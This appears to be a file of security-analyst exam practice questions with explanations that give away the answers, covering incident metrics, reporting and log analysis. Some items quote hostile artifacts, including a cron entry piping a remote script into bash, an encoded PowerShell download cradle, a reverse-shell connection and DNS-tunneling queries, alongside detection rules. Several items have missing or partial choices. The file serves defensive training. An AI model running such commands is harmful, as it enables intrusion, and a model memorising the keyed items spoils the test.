questions.stem: A metrics review distinguishes the time taken to begin acting on an incident after detection from the time taken to fully eliminate the underlying vulnerability. Which of the following pairs BEST labels these, respectively?
choices: Mean time to detect and mean time to contain
Mean time to respond and mean time to remediate
Mean time to remediate and mean time to detect
questions.explanation: Mean time to respond captures how quickly the team begins acting after detection, while mean time to remediate captures fully fixing the underlying issue. CS0-003 lists both separately, so conflating respond with remediate is the error to avoid.

questions.stem: A report tracks the average time from detection until the threat's spread is stopped (for example, the host is isolated). Which of the following metrics BEST describes this interval?
questions.explanation: Mean time to contain (MTTC) measures how long it takes to halt an incident's spread after detection. Mean time to detect (MTTD) measures identifying the incident, which precedes containment and is a different interval.

questions.stem: Leadership wants a single number showing how many alerts the SOC handled this quarter to justify staffing. Which of the following metrics BEST provides this?
questions.explanation: Alert volume counts the alerts processed over a period, supporting capacity and staffing discussions. Mean time to detect measures detection speed, not the quantity of alerts handled.

questions.stem: A vendor contract guarantees 99.9 percent uptime with financial penalties if the provider fails to meet it. Which of the following terms BEST describes this commitment?
questions.explanation: A service-level agreement (SLA) is a contractual commitment, often with penalties, between provider and customer. A service-level objective (SLO) is an internal target without the contractual penalty structure of an SLA.

questions.stem: A security team sets an internal goal to remediate critical vulnerabilities within 15 days, used to measure its own performance but not contractually binding. Which of the following terms BEST describes this target?
questions.explanation: A service-level objective (SLO) is an internal performance target the team holds itself to. A service-level agreement (SLA) is an external contractual commitment, which this internal goal is not.

questions.stem: Two organizations document a non-binding understanding to cooperate and share threat information, without contractual obligations or penalties. Which of the following terms BEST describes this document?
questions.explanation: A memorandum of understanding (MOU) records a cooperative but generally non-binding intent between parties. A service-level agreement (SLA) is a binding contract with defined obligations and penalties, unlike an MOU.

questions.stem: A vulnerability cannot be patched promptly because the affected application is an outdated, end-of-life system that the vendor no longer supports and that would break if modified. Which of the following inhibitors to remediation BEST describes this?
questions.explanation: A legacy system is an outdated, often unsupported platform that cannot easily be patched, a recognized inhibitor to remediation. Business process interruption concerns disruption from applying the fix, not the system being outdated and unsupported.

questions.stem: A patch is delayed because applying it would temporarily take a revenue-critical production line offline during business hours. Which of the following inhibitors to remediation BEST describes this concern?
questions.explanation: Business process interruption is the inhibitor when remediation would disrupt critical operations, such as halting a production line. A legacy system refers to outdated technology, which is not the issue when a current system simply cannot afford downtime.

questions.stem: A fix is held back because a vendor's closed, unmodifiable product would lose support if customers altered it themselves. Which of the following inhibitors to remediation BEST describes this?
questions.explanation: A proprietary system is a closed, vendor-controlled product the customer cannot modify, inhibiting independent remediation. A legacy system is outdated technology generally, while the constraint here is vendor control over a closed product.

questions.stem: A remediation is deferred because applying the patch would disable a feature users rely on, reducing the application's usefulness. Which of the following inhibitors to remediation BEST describes this?
questions.explanation: Degrading functionality is the inhibitor when a fix would remove or impair needed features. Business process interruption refers to operational downtime from applying the fix, not a permanent loss of feature usefulness.

questions.stem: Before writing an incident report, an analyst lists who must receive it: executives, legal, affected business units, and regulators. Which of the following activities BEST describes this step?
questions.explanation: Stakeholder identification determines which parties need to be informed and involved in incident communications. Escalation raises an incident to higher authority, which is a separate step from identifying the full audience.

questions.stem: When initial triage confirms a security event meets the criteria of a true incident, the team formally designates it as such to activate the response plan. Which of the following terms BEST describes this action?
questions.explanation: Incident declaration is the formal designation that an event is an incident, triggering the response plan. Containment is a later response action and is not the formal designation that starts the process.

questions.stem: An analyst is unsure whether an event exceeds their authority to resolve, so they raise it to a senior responder and management per policy. Which of the following terms BEST describes this action?
questions.explanation: Escalation raises an incident to higher authority or expertise when it exceeds the current handler's scope. Declaration is the formal labeling of an event as an incident, which is distinct from elevating it to higher authority.

questions.stem: A CISO needs a brief, non-technical overview of an incident's business impact and key decisions for the board, omitting deep technical detail. Which of the following report sections BEST serves this audience?
questions.explanation: An executive summary is the concise, non-technical overview of impact and decisions tailored to leadership. A technical timeline contains detailed chronology better suited to technical readers, not a board-level summary.

questions.stem: An incident report must answer who was involved, what happened, when it occurred, where it took place, and why it succeeded. Which of the following report components do these questions BEST populate?
choices: The who, what, when, where, and why narrative
questions.explanation: The who, what, when, where, and why narrative is the core descriptive component of an incident report. Service-level objectives are performance targets and do not capture the factual incident narrative.

questions.stem: After describing an incident, the report proposes specific controls and process changes to prevent recurrence. Which of the following report sections BEST contains these?
questions.explanation: The recommendations section proposes corrective actions and improvements to prevent recurrence. The timeline records the chronological sequence of events and does not contain forward-looking corrective proposals.

questions.stem: When a breach may involve regulated personal data, an organization must decide who to engage first to manage disclosure obligations and privilege. Which of the following parties should typically be consulted FIRST?
questions.explanation: Legal counsel should be engaged first to manage regulatory obligations, privilege, and disclosure strategy. Notifying the media first risks improper disclosure before legal and regulatory considerations are addressed.

questions.stem: A breach of regulated data triggers a mandatory notification to a government oversight body within a defined deadline. Which of the following communication channels BEST describes this obligation?
questions.explanation: Regulatory reporting is the mandatory notification to an oversight authority within legally defined deadlines. Public relations manages external messaging to customers and media, which is distinct from a required regulatory filing.

questions.stem: After an incident, an organization prepares customer notifications and media statements to manage reputation and public messaging. Which of the following communication functions BEST owns this?
questions.explanation: Public relations manages customer communication and media messaging to protect reputation. Regulatory reporting is a compliance obligation to authorities, not the function that crafts public and customer messaging.

questions.stem: A vulnerability report lists each finding's severity, the hosts it affects, recommended remediation, and whether it has appeared in prior scans. Which of the following report elements does the prior-appearance tracking BEST represent?
questions.explanation: Recurrence tracks whether a vulnerability has reappeared across scans, indicating remediation effectiveness. The risk score conveys severity, not whether the finding has previously appeared.

questions.stem: A report must convey, in one figure per finding, the combined severity that drives remediation order for management. Which of the following report elements BEST conveys this?
questions.explanation: A risk score expresses combined severity in a single figure to guide remediation priority. Recurrence indicates repeat appearance over time and does not by itself convey a finding's severity ranking.

questions.stem: Leadership asks for a recurring metric showing the ten most prevalent vulnerabilities across the estate to focus remediation. Which of the following reporting constructs BEST provides this?
questions.explanation: A top 10 list highlights the most prevalent or critical vulnerabilities to focus remediation effort. Mean time to detect is a detection-speed metric and does not rank the most prevalent vulnerabilities.

questions.stem: A reporting analyst wants to show whether the organization's vulnerability posture is improving or worsening over several months. Which of the following reporting constructs BEST conveys this direction?
questions.explanation: Trends show the direction of a metric over time, revealing whether posture is improving or worsening. Scope describes the breadth of a single incident and does not convey change over multiple reporting periods.

questions.stem: An auditor requires documentation demonstrating that the organization meets a regulatory standard such as PCI DSS, derived from scan and control data. Which of the following report types BEST serves this need?
questions.explanation: A compliance report demonstrates adherence to a regulatory or framework requirement using control and scan evidence. An executive summary is a high-level overview and is not structured to evidence regulatory compliance.

questions.stem: Leadership wants visibility specifically into how many actively exploited or zero-day vulnerabilities currently affect the estate, as a standing metric. Which of the following KPIs BEST captures this?
choices: Count of critical vulnerabilities and zero-days
questions.explanation: A KPI tracking the count of critical vulnerabilities and zero-days highlights the most urgent exposure for leadership. Alert volume measures SOC workload, not the count of severe or actively exploited vulnerabilities.

questions.stem: After resolving a major incident, the team holds a structured review to capture what went well, what failed, and improvements for next time. Which of the following activities BEST describes this?
questions.explanation: A lessons-learned review captures successes, failures, and improvement actions after an incident. Root cause analysis specifically pinpoints the underlying cause and is narrower than the broad improvement review described.

questions.stem: A reporting analyst must select a single measure that the organization has designated as a primary indicator of security program performance for executive review. Which of the following terms BEST describes such a designated measure?
questions.explanation: A key performance indicator (KPI) is a designated measure of performance used to track and communicate progress to leadership. An indicator of compromise (IoC) is a forensic artifact of an intrusion, not a performance measure.

questions.stem: A financial firm joins its sector's Information Sharing and Analysis Center (ISAC) to receive member-only threat data not available to the public. Which of the following collection-source categories BEST describes this feed?
questions.explanation: An information sharing organization such as an ISAC provides member-restricted data, which is closed source intelligence. Open source intelligence is gathered from publicly available sources, not member-only sharing communities.

questions.stem: A team assesses a deployed, running web application by sending live requests to find vulnerabilities at runtime, without access to the source code. Which of the following analysis types BEST describes this?
questions.explanation: Dynamic analysis (DAST) tests the running application by interacting with it, requiring no source code. Static analysis (SAST) inspects code without executing it and therefore does not match the runtime, source-free testing described.

questions.stem: A merchant that processes payment cards must implement specific controls to protect cardholder data and undergo regular validation against a named industry standard. Which of the following frameworks BEST applies?
questions.explanation: The Payment Card Industry Data Security Standard (PCI DSS) specifically governs protection of cardholder data for entities handling payment cards. The ISO 27000 series is a general information-security management framework, not the card-data-specific mandate.

questions.stem: A security information and event management (SIEM) timeline shows host 10.4.12.9 opening a new outbound TLS session to 185.220.101.47:443 every 60 seconds, each carrying 412 bytes up and 0 bytes down. Which of the following does this pattern MOST strongly indicate?
choices: Beaconing to a command and control (C2) server
A content delivery network (CDN) cache refresh
An active TCP SYN port sweep
questions.explanation: Fixed-interval, fixed-size outbound connections with no meaningful response are textbook beaconing; the regular 60-second cadence and tiny uniform payload point to an implant checking in with C2. CRL checks are sporadic and tied to certificate validation events, not a precise heartbeat, so that distractor fails the periodicity evidence.

questions.stem: An endpoint detection and response (EDR) alert captures this child process of winword.exe: powershell.exe -nop -w hidden -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0... Which of the following is the analyst's BEST immediate interpretation?
choices: A signed Microsoft update is installing in the background
A user manually opened a PowerShell console
A macro spawned an obfuscated PowerShell downloader
questions.explanation: The base64-encoded (-enc) command with -nop -w hidden launched as a child of Word is a classic malicious macro chain; the decoded payload begins with IEX(new-object...), a download cradle. A user-opened console would not be hidden, encoded, and parented by winword.exe, so that distractor does not fit the process lineage.

questions.stem: Authentication logs show user jsmith logging in successfully from 203.0.113.40 (New York) at 09:14 and from 198.51.100.7 (Singapore) at 09:31 the same day. Which of the following BEST describes this evidence?
choices: A false positive from a corporate VPN egress point
Expected behavior for a roaming mobile device
questions.explanation: Two successful authentications 17 minutes apart from cities roughly 9,500 miles apart exceed any feasible travel speed; this impossible travel is a strong account-compromise indicator warranting investigation. A VPN egress is possible but would typically present a single consistent corporate IP, not two distant public geolocations, so it is the weaker read here.

questions.stem: Sysmon Event ID 1 logs: schtasks /create /sc minute /mo 5 /tn "UpdateChecker" /tr C:\Users\Public\svc.exe /ru SYSTEM. Which of the following does this artifact MOST likely represent?
choices: Persistence via a malicious scheduled task
questions.explanation: A task running an executable from C:\Users\Public every 5 minutes as SYSTEM is a hallmark persistence mechanism (MITRE ATT&CK T1053.005); the world-writable path and generic name are red flags. Genuine Windows Update components run from protected system directories under managed service accounts, not a user-writable Public folder.

questions.stem: An email header reads: spf=pass smtp.mailfrom=mailer.acme-promos.com; dkim=pass header.d=acme-promos.com; dmarc=fail; From: billing@yourbank.example; Reply-To: collections@acme-promos.com. Which of the following is the MOST accurate conclusion?
choices: The message is fully authenticated and safe to deliver
SPF and DKIM passed for a domain that does not match the From header, a DMARC alignment failure indicating spoofing
The sending server failed SPF and should be blocked
DKIM failed, so the message body was altered in transit
questions.explanation: SPF and DKIM validated acme-promos.com, but the visible From is yourbank.example, so DMARC alignment fails; the attacker authenticated their own domain while impersonating the bank in the display From. The SPF-failed option is wrong because the header explicitly shows spf=pass; the problem is alignment, not SPF itself.

questions.stem: A file hash submitted to a multi-engine reputation service returns 58/72 detections labeled variants of "Trojan.GenericKD". Which of the following is the analyst's BEST next step?
choices: Dismiss the file as a false positive
Re-image every endpoint in the organization immediately
Treat the file as malicious and move to contain affected hosts
Whitelist the hash to reduce alert noise
questions.explanation: A 58/72 multi-engine consensus with consistent trojan labeling is strong evidence the file is malicious, so the proportionate step is to confirm scope and contain hosts where it executed. Re-imaging the entire fleet is a disproportionate over-reaction before scope is known, violating measured containment.

questions.stem: A DNS log shows hundreds of queries like a8f3c0d91e.MFRGGZDFMZTWQ2LK.exfil.baddomain.net TXT, each with a unique 50-character subdomain. Which of the following techniques does this MOST likely indicate?
choices: DNS tunneling used for data exfiltration
questions.explanation: High volumes of TXT queries with long, high-entropy, unique subdomains to a single external domain are signature DNS tunneling, encoding stolen data in the query names. Reverse DNS lookups use PTR records and IP-derived names, not random base32 subdomains, so that option does not match the artifact.

questions.stem: netstat -ano on a workstation shows: TCP 10.2.5.8:49733 91.214.124.10:4444 ESTABLISHED 6128, and tasklist maps PID 6128 to "svch0st.exe". Which of the following is the GREATEST cause for concern?
choices: The connection uses an ephemeral source port
An established session on port 4444 from a process masquerading as a system file
The workstation has an RFC 1918 private address
The process ID is a four-digit number
questions.explanation: Port 4444 is the Metasploit default and "svch0st.exe" (a zero in place of the letter o) typosquats the legitimate svchost.exe; together they indicate an active reverse shell. The ephemeral source port and private IP are normal client behavior and do not indicate compromise.

questions.stem: An EDR alert flags a new value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run named "OneDriveSync" pointing to C:\ProgramData\update\winhelper.exe. Which of the following MITRE ATT&CK techniques is this MOST consistent with?
choices: Boot or logon autostart execution for persistence
questions.explanation: A Run key that launches a binary at user logon is registry autostart persistence (T1547.001); the deceptive "OneDriveSync" name and non-standard ProgramData path reinforce that it is malicious. Credential dumping involves reading LSASS or the SAM, which a Run-key autostart entry does not by itself perform.

questions.stem: A Sigma rule contains: detection: selection: EventID: 4688 NewProcessName|endswith: '\whoami.exe' ParentImage|endswith: '\w3wp.exe' condition: selection. Which of the following behaviors does this rule detect?
choices: A web server worker process spawning reconnaissance commands
A user logging in interactively at the console
Outbound traffic to a known malicious IP
A file being encrypted by ransomware
questions.explanation: The rule matches process-creation events where w3wp.exe (the IIS worker process) is the parent of whoami.exe, a strong sign of post-exploitation reconnaissance after a web shell. It keys on process lineage in 4688 events, not on logon, network, or file-encryption telemetry, so the other options are out of the rule's scope.

questions.stem: A YARA rule reads: strings: $a = "cmd.exe /c" $b = {6A 40 68 00 30 00 00} condition: $a and $b. Which of the following BEST describes what this rule does?
choices: Blocks network connections to a C2 domain
Correlates authentication logs across multiple hosts
Captures packets matching a Berkeley Packet Filter expression
Identifies files containing both a command string and a specific byte sequence
questions.explanation: YARA matches file or memory content; this rule flags samples that contain both the ASCII string "cmd.exe /c" and the hex byte pattern (a common VirtualAlloc shellcode stub). YARA does not block network traffic or correlate logs, so those distractors confuse YARA (file pattern matching) with Snort or SIEM functions.

questions.stem: A domain controller logs 1,180 Event ID 4625 failures, each for a different username but all attempting the password "Winter2026!", from source 10.6.9.44 over 90 seconds, then one 4624 success. Which of the following attacks does this artifact MOST likely represent?
choices: A brute-force attack against a single account
Password spraying that succeeded against one account
questions.explanation: One shared password tried across many distinct accounts to evade lockout is the defining shape of password spraying, and the trailing 4624 shows one account used that weak password. A brute-force attack is the inverse pattern (many passwords against one account), so it does not fit the single-password, many-users evidence.

questions.stem: In Wireshark, an analyst follows a TCP stream on port 21 and sees: USER admin / PASS S3cr3t! / 230 Login successful. Which of the following is the MOST significant finding?
choices: File Transfer Protocol (FTP) credentials are transmitted in cleartext
The server is listening on a non-standard port
The capture was taken with tcpdump rather than Wireshark
The session is protected by TLS 1.3 encryption
questions.explanation: Port 21 FTP carries the USER and PASS exchange in plaintext, so anyone capturing the traffic reads the credentials directly; the fix is to move to FTPS or SFTP. The TLS option is contradicted by the visible cleartext, which proves the channel was not encrypted.

questions.stem: An EDR process tree shows: services.exe to spoolsv.exe to cmd.exe to rundll32.exe with no command-line arguments. Which of the following is the MOST suspicious aspect of this artifact?
choices: services.exe is running as the SYSTEM account
The print spooler spawning a shell and an argument-less rundll32.exe
The process tree contains four processes
questions.explanation: spoolsv.exe (the print spooler) has no legitimate reason to spawn cmd.exe, and rundll32.exe with no DLL or arguments is a known injection or proxy-execution indicator (T1218.011); the lineage suggests spooler exploitation. services.exe running as SYSTEM is normal and expected, so that is not the anomaly.

questions.stem: On a Linux web server, /etc/cron.d/apache2 contains: */10 * * * * www-data curl -s http://45.61.136.9/x.sh | bash. Which of the following BEST describes this entry?
choices: A malicious cron job pulling and executing a remote script for persistence
A normal Certbot certificate renewal hook
questions.explanation: A cron entry that every 10 minutes downloads a shell script from a raw IP and pipes it to bash is remote-payload persistence (T1053.003), not legitimate maintenance. Distribution package updates use the system package manager over signed repositories, not curl piped to bash from a bare IP address.

questions.stem: Apache access log: 203.0.113.88 - - [25/Jun/2026:14:02:11] "POST /uploads/img_2231.php HTTP/1.1" 200 412 "-" "python-requests/2.31". Which of the following does this log line MOST likely indicate?
choices: A normal image upload submitted by a browser
A search engine crawler indexing the site
Interaction with a web shell placed in an uploads directory
questions.explanation: A PHP file inside a user-upload folder being driven by repeated POSTs from a scripted python-requests client (not a browser) is classic web shell command execution. A legitimate image upload would target an upload handler and serve image content, not execute a .php file in the uploads path, so the benign read does not fit.

questions.stem: Threat intelligence lists the SHA-256 IoC 7d3f1a02bc9e4488d6c0f5a1e9b27c3d4f60a8915e2c7b09a1c3d5e7f9013a59 as the "Emotet loader". An endpoint reports a file in %TEMP% whose SHA-256 matches that value exactly. Which of the following is the BEST characterization of this finding?
choices: A behavioral indicator of attack (IoA) showing intent
A confirmed indicator of compromise (IoC) matching known malware
A false negative produced by the antivirus engine
A zero-day with no known signature
questions.explanation: An exact cryptographic hash match to a catalogued malware sample is a confirmed indicator of compromise, an artifact proving the known-bad file is present. It is not an IoA, which describes attacker behavior or intent rather than a static forensic artifact, nor a zero-day, since the sample is already known and signatured.

questions.stem: A network monitor shows host 10.8.2.30 uploading 47 GB to an unknown cloud storage IP between 01:00 and 03:00, while its normal nightly egress is under 200 MB. Which of the following indicators does this BEST match?
choices: A denial-of-service condition against the host
Data exfiltration via an unusual traffic spike
questions.explanation: A 47 GB outbound transfer to unfamiliar external storage, far exceeding the host's baseline, during off-hours is a textbook data-exfiltration spike. Beaconing is characterized by small, periodic check-ins rather than a single massive bulk upload, so it does not match the volume profile.

questions.stem: TLS metadata from a capture shows an internal host completing a handshake where the server certificate is self-signed, CN=localhost, valid for one day, to external IP 196.52.43.10:8443. Which of the following is the MOST reasonable concern?
choices: The certificate uses elliptic curve cryptography (ECC)
The host is performing a legitimate OCSP status check
A possible C2 channel using a throwaway self-signed certificate
questions.explanation: A self-signed, CN=localhost, one-day certificate on a high non-standard port to an unknown external IP is consistent with malware C2 that auto-generates throwaway certificates to wrap traffic in TLS. An OCSP check is an HTTP request to a certificate authority responder, not a TLS session to an arbitrary external host with a bogus certificate.

questions.stem: A user behavior analytics tool flags service account svc_backup performing interactive logons (Type 2) to ten workstations at 03:00, though it historically only runs batch logons (Type 4) on one server. Which of the following BEST explains the alert?
choices: A compromised service account being used for lateral movement
A time synchronization error on the workstations
questions.explanation: A batch service account suddenly performing interactive logons across many hosts at an unusual hour is abnormal account activity indicating credential theft and lateral movement. Time synchronization errors would alter timestamps, not change logon types or fan an account out across ten machines, so that distractor does not explain the behavior.

questions.stem: A network access control (NAC) log shows a new device with MAC 00:11:22:33:44:55 and hostname "kali" obtaining DHCP lease 10.3.7.200, then issuing ARP requests for every host in the /24. Which of the following is occurring?
choices: A rogue device performing network reconnaissance
A printer announcing itself via mDNS
questions.explanation: An unknown host named "kali" that sweeps ARP across the entire subnet immediately after joining is a rogue device conducting host-discovery reconnaissance. A DHCP renewal involves a single client-server exchange for one lease, not a subnet-wide ARP sweep, so the benign option does not fit the scanning behavior.

questions.stem: An inbound SSH brute-force originates from 193.27.228.84. AbuseIPDB reports the IP at 100% confidence of abuse with 3,400 reports, and WHOIS shows it registered to a bulletproof hosting provider. Which of the following is the analyst's BEST conclusion?
choices: The IP is a trusted partner and should be allowlisted
The reports are a false positive caused by NAT
The source is a known-malicious host and should be blocked
The IP belongs to an internal vulnerability scanner
questions.explanation: A 100% abuse confidence score with thousands of reports plus bulletproof-hosting registration is strong, corroborated reputation evidence that the source is malicious and warrants blocking. The trusted-partner allowlist option contradicts the reputation data entirely and would leave the ongoing brute-force unimpeded.

questions.stem: A phishing email contains the link http://yourbank.example.account-verify.ru/login?id=8821 displayed as the text "https://www.yourbank.example". Which of the following techniques is being used?
choices: A homograph attack using look-alike Unicode characters
An obfuscated link whose real registrable domain is account-verify.ru
questions.explanation: The actual registrable domain is account-verify.ru and "yourbank.example" is merely a subdomain label, so the displayed text masks a hostile destination; this is link obfuscation. It is not a homograph attack, which would substitute look-alike Unicode characters within the domain rather than abuse the subdomain structure.

questions.stem: A playbook triggers on every "known-malicious-hash detected" EDR alert and automatically isolates the host, opens a ticket, and notifies the SOC channel. Over a week it fired 220 times with zero analyst edits. Which of the following BEST justifies automating this task?
choices: The task is highly variable and needs human judgment each time
Automation should be reserved for low-volume tasks only
The task requires legal review before each execution
The task is repeatable and requires no human interaction, ideal for SOAR
questions.explanation: A high-volume, deterministic, decision-free workflow is exactly the kind of repeatable task suited to security orchestration, automation, and response (SOAR), freeing analysts for judgment work. The variable, needs-judgment option is the opposite of what 220 unedited runs demonstrate, so it does not justify automation.

questions.stem: A SOAR playbook receives this JSON from a reputation API: {"ip":"77.91.124.20","abuse_score":92,"country":"RU","tor_exit":true,"last_seen":"2026-06-25"}. Which of the following actions does this enrichment BEST support?
choices: Closing the alert as a false positive
Adding the IP to the trusted-partner allowlist
Auto-escalating and blocking based on the high abuse score and Tor exit status
Ignoring the alert because the data is over a month old
